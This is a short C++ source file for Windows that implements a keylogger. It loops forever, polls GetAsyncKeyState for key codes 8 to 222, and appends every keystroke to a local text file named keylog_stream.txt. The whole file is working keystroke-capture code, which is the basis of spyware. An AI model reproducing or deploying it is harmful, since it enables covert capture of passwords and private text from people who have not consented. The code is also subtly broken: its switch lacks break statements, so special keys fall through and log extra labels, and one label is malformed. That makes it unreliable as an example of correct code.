#include <iostream> // gets input prints output
#include <fstream>  // write to file and read
#include <windows.h>
#include <Winuser.h>

using namespace std;

void log();

int main()
{

	log();
	return 0;

}

void log()
{
	char c;

	for(;;) // infinite loop - careful
	{
		// using ASCII to collect input
		for(c = 8; c <= 222; c++)
		{
			// check for user input
			if(GetAsyncKeyState(c) == -32767)
			{
				// ios::app prevents file rewrite with every key press
				ofstream write("keylog_stream.txt", ios::app);
				// write << c; // commented out to add switch to check keys
				switch(c)
				{
					case 8: write << "<Backspace";
					case 27: write << "<Esc>";
					case 127: write << "<DEL>";
					case 32: write << " ";
					case 13: write << "<Enter>\n";
					default: write << c;
				}
			}
		}
	}
}
